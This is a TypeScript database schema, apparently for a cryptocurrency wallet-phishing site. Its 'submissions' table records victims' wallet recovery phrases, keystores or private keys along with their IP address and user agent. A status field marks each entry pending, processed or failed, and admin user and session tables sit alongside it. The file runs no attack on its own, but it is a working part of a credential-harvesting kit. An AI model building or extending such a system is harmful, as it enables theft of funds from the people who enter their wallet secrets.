import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp, json, boolean } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  isAdmin: boolean("is_admin").default(false),
  createdAt: timestamp("created_at").defaultNow(),
});

export const submissions = pgTable("submissions", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  wallet: text("wallet").notNull(),
  method: text("method").notNull(), // phrase, keystore, privateKey
  data: json("data").notNull(), // encrypted wallet data
  category: text("category"),
  categoryTitle: text("category_title"),
  timestamp: timestamp("timestamp").defaultNow(),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  status: text("status").default("pending"), // pending, processed, failed
});

export const adminSessions = pgTable("admin_sessions", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  userId: varchar("user_id").notNull().references(() => users.id, { onDelete: "cascade" }),
  sessionToken: text("session_token").notNull().unique(),
  expiresAt: timestamp("expires_at").notNull(),
  createdAt: timestamp("created_at").defaultNow(),
});

export const siteSettings = pgTable("site_settings", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  key: text("key").notNull().unique(),
  value: json("value"),
  updatedAt: timestamp("updated_at").defaultNow(),
});

// Types
export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;
export type Submission = typeof submissions.$inferSelect;
export type InsertSubmission = typeof submissions.$inferInsert;
export type AdminSession = typeof adminSessions.$inferSelect;
export type InsertAdminSession = typeof adminSessions.$inferInsert;
export type SiteSetting = typeof siteSettings.$inferSelect;
export type InsertSiteSetting = typeof siteSettings.$inferInsert;

// Zod schemas
export const insertUserSchema = createInsertSchema(users);
export const insertSubmissionSchema = createInsertSchema(submissions);
export const insertAdminSessionSchema = createInsertSchema(adminSessions);
export const insertSiteSettingSchema = createInsertSchema(siteSettings);
